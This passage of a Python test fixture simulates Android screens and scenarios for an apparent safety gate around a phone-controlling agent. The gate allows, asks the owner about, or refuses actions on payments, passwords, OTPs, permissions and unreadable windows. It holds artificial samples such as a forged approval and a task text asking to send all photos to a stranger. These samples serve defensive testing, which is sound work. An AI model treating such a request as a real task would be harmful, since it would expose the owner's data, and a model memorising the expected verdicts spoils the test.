        step("key", "amazon_product", refuse("gate_rate_limited", rule="builtin:act_rate"), name="BACK"),
        {"advance_ms": 1000}, step("key", "amazon_product", allow(), name="BACK")], tags=["limits"], call_ms=0),
]

SCREENS["whatsapp_chat_busy"] = {**SCREENS["whatsapp_chat"], "quiet_ms": 40}

# --- review round 1 (B2, B4, B5, B6, Build number, VPN consent, N3) ---------------------------------------
SCREENS.update({
    # An app window the phone can't read yet (null root: an app still starting, maybe a bank).
    "loading_unknown": screen(app("com.google.android.apps.nexuslauncher", []),
                              {"id": 6, "type": "application", "layer": 6, "package": "", "title": "",
                               "bounds": FULL}, labels=LABELS),
    # A deep tree the phone stopped reading under the point.
    "deep_truncated": screen(app("com.example.news", [
        node(cls="android.webkit.WebView", bounds=(0, 200, W, H), children=[
            node(cls="android.view.View", bounds=(0, 1500, W, 1800), truncated=True)])]), labels=LABELS),
    "settings_about": settings("About phone", ["Model", "Android version", "Build number"]),
    "vpn_consent": screen(
        app("com.whatsapp", [node(text="Chats", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.android.vpndialogs", "title": "",
         "bounds": [0, 1000, W, 1800], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1000, W, 1800), children=[
             node(text="Connection request", bounds=(40, 1020, 1040, 1100)),
             node(text="Example wants to set up a connection that allows it to monitor network traffic.",
                  bounds=(40, 1120, 1040, 1300)),
             button("OK", "android:id/button1", (540, 1600, 1040, 1700))])}, labels=LABELS),
    "contacts_app": screen(app("com.google.android.contacts", [node(text="Contacts", bounds=(0, 200, W, 400)),
                                                               button("Ann", "", (0, 500, W, 650))]), labels=LABELS),
    "permission_dialog_contacts_word": screen(
        app("com.google.android.contacts", [node(text="Ann", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.google.android.permissioncontroller",
         "title": "", "bounds": [0, 1200, W, 2000], "root": node(cls="android.widget.FrameLayout",
         bounds=(0, 1200, W, 2000), children=[
             node(text="Allow Spyware to access your contacts?",
                  id="com.android.permissioncontroller:id/permission_message", bounds=(40, 1250, 1040, 1400)),
             button("Allow", "com.android.permissioncontroller:id/permission_allow_button", (40, 1500, 1040, 1600))])},
        labels=LABELS),
    # In-app WebView (not a browser) with a focused card field, and the autofill suggestion over it.
    "inapp_webview_autofill": screen(
        app("com.example.app", [node(cls="android.webkit.WebView", bounds=(0, 200, W, 1600), children=[
            node(id="card", cls="android.widget.EditText", hint="Card", editable=True, focused=True,
                 bounds=(40, 400, 1040, 500))])]),
        {"id": 7, "type": "system", "layer": 5, "package": "com.google.android.gms", "title": "Autofill",
         "bounds": [0, 1700, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1700, W, 2000), children=[
             button("Visa •••• 4242", "autofill_dataset", (40, 1720, 1040, 1820))])},
        autofill_service="com.google.android.gms", labels=LABELS),
    "native_autofill": screen(
        app("com.example.app", [node(id="email", cls="android.widget.EditText", hint="Email", editable=True,
                                     focused=True, bounds=(40, 400, 1040, 500))]),
        {"id": 7, "type": "system", "layer": 5, "package": "com.google.android.gms", "title": "Autofill",
         "bounds": [0, 1700, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1700, W, 2000), children=[
             button("ann@example.com", "autofill_dataset", (40, 1720, 1040, 1820))])},
        autofill_service="com.google.android.gms", labels=LABELS),
})
LABELS["com.kalshi"] = "Kalshi"


def location_dialog(vendor="com.google.android.permissioncontroller", message=None, buttons=("foreground", "one_time", "deny"),
                    cards=True, prefix="com.android.permissioncontroller:id/", approx_selected=False):
    """A runtime permission dialog over Kalshi (Google, or Samsung with its own package and ids)."""
    kids = [node(text=message or "Allow Kalshi to access this device's location?", id=prefix + "permission_message",
                 bounds=(40, 1050, 1040, 1150))]
    if cards:
        kids += [node(cls="android.widget.RadioButton", text="Precise", id=prefix + "permission_location_accuracy_radio_fine",
                      bounds=(40, 1170, 520, 1400), clickable=True, checked=not approx_selected),
                 node(cls="android.widget.RadioButton", text="Approximate",
                      id=prefix + "permission_location_accuracy_radio_coarse", bounds=(560, 1170, 1040, 1400),
                      clickable=True, checked=approx_selected)]
    labels = {"foreground": ("permission_allow_foreground_only_button", "While using the app"),
              "one_time": ("permission_allow_one_time_button", "Only this time"),
              "always": ("permission_allow_always_button", "Allow all the time"),
              "allow": ("permission_allow_button", "Allow"),
              "deny": ("permission_deny_button", "Don't allow")}
    for i, role in enumerate(buttons):
        rid, text = labels[role]
        kids.append(button(text, prefix + rid, (40, 1450 + 130 * i, 1040, 1560 + 130 * i)))
    return screen(app("com.kalshi", [node(text="Markets", bounds=(0, 200, W, 400))]),
                  {"id": 5, "type": "application", "layer": 5, "package": vendor, "title": "",
                   "bounds": [0, 1000, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1000, W, 2000),
                                                            children=kids)}, labels=LABELS)


SCREENS.update({
    "kalshi_app": screen(app("com.kalshi", [button("Markets", "markets", (0, 200, W, 400))]), labels=LABELS),
    "location_google": location_dialog(),  # Android 12+ pre-selects Precise
    "location_approx": location_dialog(approx_selected=True),
    "location_samsung": location_dialog(vendor="com.samsung.android.permissioncontroller",
                                        prefix="com.samsung.android.permissioncontroller:id/"),
    "location_always_only": location_dialog(buttons=("always", "deny"), cards=False),
    "notifications_kalshi": location_dialog(message="Allow Kalshi to send you notifications?", buttons=("allow", "deny"),
                                            cards=False),
    "camera_kalshi": location_dialog(message="Allow Kalshi to take pictures and record video?",
                                     buttons=("foreground", "one_time", "deny"), cards=False),
    "location_other_app": location_dialog(message="Allow Tracker to access this device's location?"),
})
WHILE_USING, ONCE, DENY_BTN = dict(x=540, y=1505), dict(x=540, y=1635), dict(x=540, y=1765)
PRECISE, APPROX = dict(x=280, y=1285), dict(x=800, y=1285)


def perm_default(perm, value, sig="valid"):
    return {"policy": {"type": "permission_default", "perm": perm, "value": value}, "sig": sig,
            "expect_accepted": sig == "valid"}


KALSHI = step("tap", "kalshi_app", allow(), x=540, y=300)
SCENARIOS += [
    sc("location by default: Approximate, then Only this time, no prompt", [
        KALSHI,
        step("tap", "location_google", refuse("gate_permission_choice", rule="permission:location_accuracy"), **ONCE),
        step("tap", "location_google", allow(), **APPROX),
        step("tap", "location_approx", allow(), **ONCE),
        step("tap", "location_approx", ask("permission", level="tap", rule="risk:permission:location"), **WHILE_USING),
        step("tap", "location_google", ask("permission", rule="risk:permission:location_accuracy"), **PRECISE),
        step("tap", "location_google", allow(), **DENY_BTN)], tags=["permissions"]),
    sc("Samsung's permission controller is read the same way", [
        KALSHI, step("tap", "location_samsung", allow(), **APPROX),
        step("tap", "location_samsung", ask("permission"), **PRECISE),
        step("tap", "location_samsung", ask("permission"), **WHILE_USING)], tags=["permissions"]),
    sc("signed defaults: while using and precise", [
        KALSHI, perm_default("location", "while_using"), perm_default("location_accuracy", "precise"),
        step("tap", "location_google", allow(), **PRECISE),
        step("tap", "location_google", allow(), **WHILE_USING),
        step("tap", "location_google", allow(), **ONCE)], tags=["permissions"]),
    sc("default once: only this time passes, while using asks", [
        KALSHI,
        step("tap", "location_approx", allow(), **ONCE),
        step("tap", "location_approx", ask("permission"), **WHILE_USING)], tags=["permissions"]),
    sc("a pre-selected Precise is not granted against an approximate setting", [
        KALSHI, perm_default("location", "while_using"),
        step("tap", "location_google", refuse("gate_permission_choice", rule="permission:location_accuracy"),
             **WHILE_USING),
        step("tap", "location_google", allow(), **APPROX),
        step("tap", "location_approx", allow(), **WHILE_USING)], tags=["permissions"]),
    sc("a permission button the phone doesn't recognize asks", [
        KALSHI, perm_default("location", "while_using"),
        step("tap", "location_oem_unknown", ask("permission", level="tap", rule="risk:permission:unknown"),
             x=540, y=1505),
        step("tap", "location_oem_unknown", allow(), x=540, y=1100)], tags=["permissions"]),
    sc("an unsigned default changes nothing", [
        KALSHI, perm_default("location", "while_using", sig="bad"),
        step("tap", "location_google", ask("permission"), **WHILE_USING)], tags=["permissions"]),
    sc("never Allow all the time, whatever the setting", [
        KALSHI, perm_default("location", "while_using"),
        step("tap", "location_always_only", refuse("gate_permission_choice", rule="permission:always"), x=540, y=1505),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "location_always_only", refuse("gate_permission_choice"), mode="never", x=540, y=1505)],
       tags=["permissions"]),
    sc("Don't ask: only this time still passes, a wider grant is refused, deny wins", [
        KALSHI, {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "camera_kalshi", allow(), mode="never", **ONCE),
        step("tap", "camera_kalshi", refuse("gate_denied", rule="never:permission:camera"), mode="never",
             **WHILE_USING),
        step("tap", "camera_kalshi", allow(), mode="never", **DENY_BTN),
        perm_default("camera", "deny"),
        step("tap", "camera_kalshi", refuse("gate_permission_choice", rule="permission:camera:deny"), **ONCE),
        step("tap", "camera_kalshi", allow(), **DENY_BTN)], tags=["permissions"]),
    sc("notifications: allowed by default, the owner's deny wins", [
        KALSHI, step("tap", "notifications_kalshi", allow(), x=540, y=1505),
        step("tap", "notifications_kalshi", allow(), x=540, y=1635),
        perm_default("notifications", "deny"),
        step("tap", "notifications_kalshi", refuse("gate_permission_choice"), x=540, y=1505)], tags=["permissions"]),
    sc("another app's location request asks even with a loose default", [
        KALSHI, perm_default("location", "while_using"),
        step("tap", "location_other_app", ask("permission", level="tap", rule="risk:permission:other_app"),
             **WHILE_USING)], tags=["permissions"]),
    sc("Always allow for Kalshi: a per-app override", [
        KALSHI, step("tap", "location_approx", ask("permission"), **WHILE_USING),
        {"approve": "last", "sig": "valid", "grant": True},
        step("tap", "location_approx", allow(), **WHILE_USING),
        step("tap", "location_approx", allow(), **ONCE),
        step("tap", "location_approx", allow(), **WHILE_USING),
        step("tap", "location_google", ask("permission"), **PRECISE)], tags=["permissions", "grants"]),
]

SCREENS.update({
    # An OEM dialog with its own ids and a non-English grant button.
    "location_oem_unknown": screen(app("com.kalshi", [node(text="Markets", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.google.android.permissioncontroller",
         "title": "", "bounds": [0, 1000, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1000, W, 2000),
         children=[node(text="Allow Kalshi to access this device's location?",
                        id="com.android.permissioncontroller:id/permission_message", bounds=(40, 1050, 1040, 1150)),
                   button("Erlauben", "com.oem.perm:id/btn_positive", (40, 1450, 1040, 1560))])}, labels=LABELS),
    # The phone has an input focus it couldn't read (deep in a WebView, past the walk's limits).
    "otp_focus_unread": screen(app("com.example.shop", [node(cls="android.webkit.WebView", bounds=(0, 200, W, H))]),
                               focus={"expected": True}, labels=LABELS),
    # A focused field in a window the phone can't identify.
    "focus_unknown_window": screen({"id": 6, "type": "application", "layer": 6, "package": "", "title": "",
                                    "bounds": FULL, "root": node(cls="android.widget.FrameLayout", bounds=FULL, children=[
                                        node(id="otp", cls="android.widget.EditText", editable=True, focused=True,
                                             bounds=(40, 400, 1040, 500))])}, focus={"expected": True}, labels=LABELS),
})
SCENARIOS += [
    sc("typing and ENTER into a focus the phone couldn't read are refused", [
        step("type_text", "otp_focus_unread", refuse("gate_screen_unstable", rule="builtin:focus_unread"), text="123456"),
        step("key", "otp_focus_unread", refuse("gate_screen_unstable", rule="builtin:focus_unread"), name="ENTER"),
        step("type_text", "focus_unknown_window", refuse("gate_screen_unstable", rule="builtin:unknown_window"),
             text="123456"),
        step("key", "focus_unknown_window", refuse("gate_screen_unstable"), name="ENTER"),
        step("key", "otp_focus_unread", allow(), name="BACK")], tags=["hard_deny"]),
]

# --- B7 follow-ups: dialogs Android 14+ hides, touches on nothing, no accessibility service ----------------
HIDDEN_PERMISSION_EVENT = {"package": "com.google.android.permissioncontroller",
                           "text": "Allow Kalshi to access this device's location?"}
SCREENS.update({
    # Android 14+: the permission dialog's window is listed with no readable root (no package either).
    "hidden_permission_dialog": screen(
        app("com.kalshi", [node(text="Markets", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "", "title": "", "bounds": [0, 1000, W, 2000]},
        event=HIDDEN_PERMISSION_EVENT, labels=LABELS),
    # Samsung: the window names its package, but its tree has no text.
    "hidden_permission_samsung": screen(
        app("com.kalshi", [node(text="Markets", bounds=(0, 200, W, 400))]),
        {"id": 5, "type": "application", "layer": 5, "package": "com.samsung.android.permissioncontroller",
         "title": "", "bounds": [0, 1000, W, 2000], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1000, W, 2000))},
        event={"package": "com.samsung.android.permissioncontroller", "text": ""}, labels=LABELS),
    # A small window only partly covering the screen: nothing the phone knows of is under the bottom.
    "partial_window": {"windows": [{"id": 1, "type": "application", "layer": 1, "package": "com.example.app",
                                    "title": "", "bounds": [0, 0, W, 1200],
                                    "root": node(cls="android.widget.FrameLayout", bounds=(0, 0, W, 1200),
                                                 children=[button("Home", "home", (0, 100, W, 300))])}],
                       "labels": LABELS},
    "no_accessibility": {"windows": [], "accessibility": False, "labels": LABELS},
})
SCENARIOS += [
    sc("a system dialog the phone can't read pauses for the owner", [
        # No package and no OCR'd title: the event alone doesn't identify it (review hardening): unknown window.
        step("tap", "hidden_permission_dialog",
             refuse("gate_screen_unstable", rule="builtin:unknown_window"), x=540, y=1500),
        step("wake_unlock", "hidden_permission_dialog", allow()),
        step("screenshot", "hidden_permission_dialog", {"decision": "redact"}),
        step("stream_start", "hidden_permission_dialog", refuse("gate_blocked_app")),
        step("screenshot", "loading_unknown", {"decision": "redact"}),  # unidentified: still black
        # Its own package identifies it (Samsung): reads show it; acts wait for the owner without OCR.
        step("screenshot", "hidden_permission_samsung", allow()),
        step("ui_elements", "hidden_permission_samsung", allow()),
        step("tap", "hidden_permission_samsung", refuse("needs_owner_dialog"), x=540, y=300),
        step("tap", "kalshi_app", allow(), x=540, y=300)], tags=["hard_deny"]),
    sc("a touch where the phone sees no window is refused", [
        step("tap", "partial_window", refuse("gate_screen_unstable", rule="builtin:no_window"), x=540, y=2000),
        step("long_press", "partial_window", refuse("gate_screen_unstable"), x=540, y=2000, duration_ms=800),
        step("tap", "partial_window", allow(), x=540, y=200)], tags=["hard_deny"]),
    sc("without the accessibility service every act is refused", [
        step("tap", "no_accessibility", refuse("gate_unavailable"), x=540, y=200),
        step("key", "no_accessibility", refuse("gate_unavailable"), name="BACK"),
        step("launch_app", "no_accessibility", refuse("gate_unavailable"), package="com.example.app"),
        step("device_state", "no_accessibility", allow())], tags=["hard_deny"]),
]

# --- a Compose text field the tree walk doesn't enumerate, resolved from the live input focus ----------------
MESSAGES_APP = "com.google.android.apps.messaging"
LABELS[MESSAGES_APP] = "Messages"


def compose_screen(pkg=MESSAGES_APP, window_pkg=None, field=None, window_id=1, ancestors=True):
    row = [button("", "ComposeRowIcon:Shortcuts", (23, 1151, 158, 1309)),
           button("", "ComposeRowIcon:Gallery", (741, 1151, 876, 1309)),
           node(desc="Send SMS", id="Compose:Draft:Send", cls="android.view.View", bounds=(899, 1151, 1057, 1309),
                clickable=True)]
    focus_node = field or node(cls="android.widget.EditText", hint="Text message", editable=True, focused=True,
                               bounds=(158, 1151, 606, 1309))
    return screen(
        {"id": 1, "type": "application", "layer": 1, "package": window_pkg if window_pkg is not None else pkg,
         "title": "", "bounds": FULL, "root": node(cls="android.widget.FrameLayout", bounds=FULL, children=row)},
        focus={"expected": True, "window": window_id, "node": focus_node,
               "ancestors": [node(cls="android.view.View", bounds=(23, 1151, 876, 1309))] if ancestors else []},
        labels=LABELS)


SCREENS.update({
    "compose_field": compose_screen(),
    "compose_password": compose_screen(field=node(cls="android.widget.EditText", editable=True, focused=True,
                                                  password=True, bounds=(158, 1151, 606, 1309))),
    "compose_otp": compose_screen(field=node(cls="android.widget.EditText", hint="Enter code", id="otp", editable=True,
                                             focused=True, bounds=(158, 1151, 606, 1309))),
    "compose_blocked": compose_screen(pkg="com.chase.sig.android"),
    "compose_unknown_window": compose_screen(window_pkg=""),
    "compose_unlisted_window": compose_screen(window_id=42),
    "compose_webview": compose_screen(pkg="com.example.app", ancestors=False,
                                      field=node(cls="android.widget.EditText", hint="Card number", editable=True,
                                                 focused=True, bounds=(158, 1151, 606, 1309))),
})
SCENARIOS += [
    sc("a focused Compose field missing from the walked tree is resolved from the live focus", [
        step("type_text", "compose_field", allow(), text="On my way"),
        step("key", "compose_field", ask("send", rule="risk:enter:messaging"), name="ENTER"),
        step("type_text", "compose_password", refuse("gate_password_field"), text="hunter2"),
        step("type_text", "compose_otp", ask("fill", rule="risk:otp_field"), text="123456"),
        step("type_text", "compose_blocked", refuse("gate_blocked_app"), text="hello"),
        step("type_text", "compose_unknown_window", refuse("gate_screen_unstable", rule="builtin:unknown_window"),
             text="hello"),
        step("type_text", "compose_unlisted_window", refuse("gate_screen_unstable", rule="builtin:focus_unread"),
             text="hello"),
        step("type_text", "compose_webview", ask("fill", rule="risk:card_field"), text="4242")], tags=["hard_deny"]),
]

# --- live screens: a prediction market whose odds tick every second (real-device report, Kalshi) ------------
KALSHI_PKG = "com.kalshi.mobile"
LABELS[KALSHI_PKG] = "Kalshi"


def kalshi_market(dun="42%", jan="58%", volume="$1.2M"):
    return screen(app(KALSHI_PKG, [
        node(text="Jane Smith vs Dun Lee", bounds=(40, 150, 1040, 230)),
        node(text=f"Volume {volume}", bounds=(40, 250, 600, 300)),
        node(text="Live · Set 2", bounds=(40, 320, 600, 370)),
        button(f"DUN · {dun}", "", (40, 1200, 520, 1320)),
        button(f"JAN · {jan}", "", (560, 1200, 1040, 1320))]), labels=LABELS, quiet_ms=40)


def kalshi_ticket(cost="$5.00", payout="$11.90", odds="42%"):
    return screen(app(KALSHI_PKG, [
        node(text="Buy Yes · DUN", bounds=(40, 150, 1040, 230)),
        node(text=f"Chance {odds}", bounds=(40, 250, 1040, 300)),
        node(text=f"Cost {cost}", bounds=(40, 600, 1040, 660)),
        node(text=f"Payout {payout}", bounds=(40, 680, 1040, 740)),
        button("Submit", "submit_order", (40, 1600, 1040, 1720)),
        node(desc="Swipe to buy", id="swipe_buy", cls="android.widget.SeekBar", bounds=(40, 1800, 1040, 1900),
             clickable=True)]), labels=LABELS)


SCREENS.update({
    "kalshi_market": kalshi_market(),
    "kalshi_market_tick": kalshi_market(dun="47%", jan="53%", volume="$1.3M"),
    "kalshi_ticket": kalshi_ticket(),
    "kalshi_ticket_odds": kalshi_ticket(odds="44%"),
    "kalshi_ticket_repriced": kalshi_ticket(cost="$5.40", payout="$12.80"),
    "ticker_board": screen(app("com.example.trading", [
        node(text=t, bounds=(40, 200 + 90 * i, 1040, 280 + 90 * i))
        for i, t in enumerate(["AAPL 189.20 +1.2%", "TSLA 242.10 −0.8%", "NVDA 121.50 +2.4%", "YES 63¢",
                               "NO 37¢", "BTC $67,120"])] + [button("AAPL", "", (40, 900, 1040, 1000))]),
        labels=LABELS),
})
DUN = dict(x=280, y=1260)
SUBMIT = dict(x=540, y=1660)
SCENARIOS += [
    sc("choosing a side on a live market doesn't ask, and odds ticking don't block it", [
        step("tap", "kalshi_market", allow(), **DUN),
        step("tap", "kalshi_market", allow(), reverify="kalshi_market_tick", **DUN)], tags=["risk", "toctou"]),
    sc("the commit asks; a tick elsewhere keeps the permit, a changed cost voids it", [
        step("tap", "kalshi_ticket", ask("pay", rule="risk:words:submit"), **SUBMIT),
        {"approve": "last", "sig": "valid"},
        step("tap", "kalshi_ticket", allow(), reverify="kalshi_ticket_odds", **SUBMIT),
        step("tap", "kalshi_ticket", ask("pay"), **SUBMIT),
        {"approve": "last", "sig": "valid"},
        step("tap", "kalshi_ticket", refuse("gate_screen_changed", rule="builtin:price_changed"),
             reverify="kalshi_ticket_repriced", **SUBMIT),
        step("tap", "kalshi_ticket", ask("pay"), **SUBMIT)], tags=["permits", "toctou"]),
    sc("swipe to buy asks", [
        step("swipe", "kalshi_ticket", ask("pay"), x1=60, y1=1850, x2=1000, y2=1850, duration_ms=400)], tags=["risk"]),
    sc("ticker labels are not an unrecognized language", [
        step("tap", "ticker_board", allow(), x=540, y=950)], tags=["risk"]),
    sc("only prompts the owner saw count toward the limit; the same action reuses its prompt", [
        *[s for _ in range(8) for s in (step("tap", "whatsapp_chat", ask("send"), **SEND), {"cancel": "last"})],
        *[step("tap", "loading_unknown", refuse("gate_screen_unstable"), x=540, y=900) for _ in range(5)],
        step("tap", "whatsapp_chat", ask("send"), **SEND),
        step("tap", "whatsapp_chat", ask("send"), **SEND),  # asked again: the same prompt, not a new one
        {"shown": "last"}, {"cancel": "last"},
        *[s for _ in range(5) for s in (step("tap", "whatsapp_chat", ask("send"), **SEND), {"shown": "last"},
                                        {"cancel": "last"})],
        step("tap", "whatsapp_chat", refuse("gate_rate_limited", rule="builtin:prompt_rate"), **SEND)],
       tags=["limits"], keep_open=True),
]

# --- task approval (by owner request): one prompt for the task, then its non-money risky steps run ----------
YT = "com.google.android.youtube"
LABELS[YT] = "YouTube"
SCREENS.update({
    "youtube_channel": screen(app(YT, [
        node(text="PewDiePie", bounds=(40, 300, 800, 380)),
        node(text="111M subscribers", bounds=(40, 390, 800, 440)),
        button("Subscribe", "subscribe_button", (40, 460, 500, 560)),
        node(desc="Show more menu", id="com.google.android.youtube:id/menu_button", cls="android.widget.ImageView",
             bounds=(960, 300, 1060, 400), clickable=True)]), labels=LABELS),
    "youtube_join": screen(app(YT, [
        node(text="PewDiePie", bounds=(40, 300, 800, 380)),
        button("Join", "join_button", (540, 460, 1040, 560)),
        node(text="$4.99/month", bounds=(540, 570, 1040, 620))]), labels=LABELS),
})
SHARE_TEXT = "share PewDiePie's channel with myself on Messenger"
TASK = dict(task="t1")


def task_grant(expect, task="t1", text=SHARE_TEXT, screen_name="youtube_channel"):
    return step("task_grant", screen_name, expect, task=task, text=text, source="Dashboard")


SCENARIOS += [
    sc("one task prompt, then the share flow needs no more", [
        task_grant(ask("task")), {"approve": "last", "sig": "valid"},
        task_grant(allow(rule="task_grant")),  # re-asked: the same grant
        step("tap", "youtube_channel", allow(rule="task_grant"), hint="the agent opens the menu", x=1010, y=350,
             **TASK),
        step("tap", "share_sheet", allow(rule="task_grant"), x=170, y=1600, **TASK),
        step("tap", "messenger_friend", allow(rule="task_grant"), **SEND, **TASK),
        step("tap", "youtube_channel", allow(), x=270, y=510, **TASK),  # the free Subscribe isn't money
        # Still asked: money. Still refused: the hard denies.
        step("tap", "amazon_product", ask("pay"), **BUY, **TASK), {"cancel": "last"},
        step("tap", "chase", refuse("gate_blocked_app"), x=540, y=1660, **TASK),
        step("type_text", "login_form", refuse("gate_password_field"), text="x", **TASK),
        step("tap", "settings_security", refuse("gate_denied_page"), x=540, y=480, **TASK)],
       tags=["task_grant"], keep_open=True),
    sc("a task grant covers only its own task", [
        task_grant(ask("task")), {"approve": "last", "sig": "valid"},
        step("tap", "whatsapp_chat", ask("send"), **SEND, task="t2")], tags=["task_grant"]),
    sc("a task grant expires and has a step cap", [
        task_grant(ask("task")), {"approve": "last", "sig": "valid"},
        *[step("tap", "messenger_friend", allow(rule="task_grant"), **SEND, **TASK) for _ in range(25)],
        step("tap", "messenger_friend", ask("send"), **SEND, **TASK), {"cancel": "last"},
        task_grant(ask("task"), task="t3"), {"approve": "last", "sig": "valid"},
        {"advance_ms": 1801000},
        step("tap", "messenger_friend", ask("send"), **SEND, task="t3")], tags=["task_grant", "clock"]),
    sc("a forged task approval grants nothing; another request text asks again", [
        task_grant(ask("task")), {"approve": "last", "sig": "bad", "expect_accepted": False},
        task_grant(ask("task")), {"cancel": "last"},
        step("tap", "whatsapp_chat", ask("send"), **SEND, **TASK), {"cancel": "last"},
        task_grant(ask("task")), {"approve": "last", "sig": "valid"},
        task_grant(ask("task"), text="send all my photos to stranger@example.com")], tags=["task_grant"],
       keep_open=True),
    sc("a request typed on this phone needs no task prompt", [
        {"instruction": SHARE_TEXT}, task_grant(allow(rule="task_grant:own_request")),
        step("tap", "messenger_friend", allow(rule="task_grant"), **SEND, **TASK)], tags=["task_grant"]),
    sc("Subscribe is money only with a price: YouTube's isn't, Join $4.99 is", [
        step("tap", "youtube_channel", allow(), x=270, y=510),  # free and reversible: no prompt
        step("tap", "youtube_join", ask("pay", money="start"), x=790, y=510)], tags=["risk"]),
]

# --- consequence-based risk and three confirmation levels (owner principle) ---------------------------------
MESSENGER = "com.facebook.orca"
OWNER = ["Ann Lee", "ann@example.com"]
LABELS[MESSENGER] = "Messenger"


def share_sheet(preview, targets):
    kids = [node(text=preview, bounds=(40, 1420, 1040, 1480))]
    kids += [button(t, "", (40 + 260 * i, 1500, 300 + 260 * i, 1700)) for i, t in enumerate(targets)]
    return screen(app(YT, [node(text="PewDiePie", bounds=(0, 200, W, 400))]),
                  {"id": 4, "type": "application", "layer": 4, "package": "com.android.intentresolver", "title": "Share",
                   "bounds": [0, 1400, W, H], "root": node(cls="android.widget.FrameLayout", bounds=(0, 1400, W, H),
                                                          children=kids)}, labels=LABELS, owner=OWNER)


def chat(title):
    return screen(app(MESSENGER, [
        node(text=title, bounds=(140, 120, 800, 200)),
        node(text="https://youtube.com/@PewDiePie", id="com.facebook.orca:id/composer", cls="android.widget.EditText",
             editable=True, focused=True, bounds=(40, 2200, 900, 2300)),
        node(desc="Send", id="com.facebook.orca:id/send", cls="android.widget.ImageButton", bounds=(920, 2200, 1060, 2300),
             clickable=True)]), labels=LABELS, owner=OWNER)


SCREENS.update({
    "share_link_sheet": share_sheet("https://youtube.com/@PewDiePie", ["Ann Lee (You)", "Bob", "Copy link", "Note to self"]),
    "share_photo_sheet": share_sheet("1 photo", ["Ann Lee (You)", "Bob"]),
    "messenger_self": chat("Ann Lee"),
    "messenger_friend": chat("Bob Smith"),
    "youtube_video": screen(app(YT, [button("Like", "like_button", (40, 1500, 300, 1600)),
                                     button("Unsubscribe", "unsubscribe_button", (340, 1500, 800, 1600)),
                                     button("Save", "save_button", (840, 1500, 1040, 1600))]), labels=LABELS),
    "photo_viewer": screen(app("com.google.android.apps.photos", [
        node(desc="Delete", id="com.google.android.apps.photos:id/trash", cls="android.widget.ImageButton",
             bounds=(900, 2200, 1040, 2300), clickable=True)]), labels=LABELS),
    "instagram_post": screen(app("com.instagram.android", [button("Post", "post_button", (40, 2200, 1040, 2300)),
                                                           node(text="New post", bounds=(40, 120, 800, 200))]),
                             labels=LABELS),
})
def share_list(rows):
    """Messenger's own share list (after choosing Messenger in the share sheet): the link, then a row per person
    with a Send button."""
    kids = [node(text="https://youtube.com/@PewDiePie", bounds=(40, 150, 1040, 230))]
    for i, name in enumerate(rows):
        top = 600 + 140 * i
        kids.append(node(cls="android.widget.LinearLayout", bounds=(0, top, W, top + 120), children=[
            node(text=name, bounds=(140, top + 20, 700, top + 100)),
            button("Send", "com.facebook.orca:id/send_button", (840, top + 10, 1020, top + 110))]))
    return screen(app(MESSENGER, kids), labels=LABELS, owner=OWNER)


SCREENS.update({
    "messenger_share_list": share_list(["Ann Lee", "Bob Smith"]),
    "messenger_spoofed_self": chat("Miss you"),
    "messenger_note_to_self": chat("Note to self"),
    "settings_oem_unknown": settings("Knox guard", [("Some protection", 420, "android:id/title", True)]),
    "paywall_offscreen_price": screen(app("com.example.news", [
        node(text="Unlimited access", bounds=(40, 150, 1040, 230)),
        node(text="Card on file: Visa •••• 4242 · Total due today", bounds=(40, 300, 1040, 380)),
        node(id="card", cls="android.widget.EditText", hint="Card number", editable=True, bounds=(40, 400, 1040, 500)),
        button("Subscribe", "subscribe", (40, 1600, 1040, 1720))]), labels=LABELS),
    "shop_subscribe": screen(app("com.example.shop", [button("Subscribe", "subscribe", (40, 1600, 1040, 1720))]),
                             labels=LABELS),
})
EVERYDAY = {"policy": {"type": "everyday", "on": True}, "sig": "valid", "expect_accepted": True}
SCENARIOS += [
    sc("everyday low-risk flows: no prompt", [
        step("tap", "share_link_sheet", allow(), x=170, y=1600),          # the YouTube link to yourself
        step("tap", "share_link_sheet", allow(), x=690, y=1600),          # Copy link
        step("tap", "share_link_sheet", allow(), x=950, y=1600),          # Note to self
        step("tap", "messenger_share_list", allow(), x=930, y=650),       # Messenger's own list: Send next to you
        step("tap", "youtube_video", allow(), x=170, y=1550),             # like
        step("tap", "youtube_video", allow(), x=570, y=1550),             # unsubscribe
        step("tap", "youtube_video", allow(), x=940, y=1550),             # save
        step("tap", "youtube_channel", allow(), x=270, y=510)], tags=["consequence", "friction"]),
    sc("consequential actions ask with a tap; money and dangerous ones with a fingerprint", [
        step("tap", "share_link_sheet", ask("share", level="tap", rule="risk:share:link"), x=430, y=1600),
        {"cancel": "last"},
        step("tap", "share_photo_sheet", ask("share", level="tap", rule="risk:share:content"), x=170, y=1600),
        {"cancel": "last"},
        step("tap", "messenger_friend", ask("send", level="tap"), x=990, y=2250), {"cancel": "last"},
        step("tap", "photo_viewer", ask("delete", level="tap"), x=970, y=2250), {"cancel": "last"},
        step("tap", "instagram_post", ask("post", level="tap"), x=540, y=2250), {"cancel": "last"},
        step("tap", "kalshi_ticket", ask("pay", level="fingerprint"), **SUBMIT), {"cancel": "last"},
        step("tap", "youtube_join", ask("pay", level="fingerprint"), x=790, y=510), {"cancel": "last"},
        step("type_text", "otp_form", ask("fill", level="fingerprint"), text="123456")],
       tags=["consequence"], keep_open=True),
    sc("a tap-level prompt is approved with the tap key; a fingerprint prompt only with the screen lock", [
        step("tap", "photo_viewer", ask("delete", level="tap"), x=970, y=2250),
        {"approve": "last", "sig": "valid"},
        step("tap", "photo_viewer", allow(), x=970, y=2250),
        step("tap", "kalshi_ticket", ask("pay", level="fingerprint"), **SUBMIT),
        {"approve": "last", "sig": "other_key", "expect_accepted": False},  # a tap can't approve money
        {"approve": "last", "sig": "valid"},
        step("tap", "kalshi_ticket", allow(), **SUBMIT)], tags=["consequence", "permits"]),
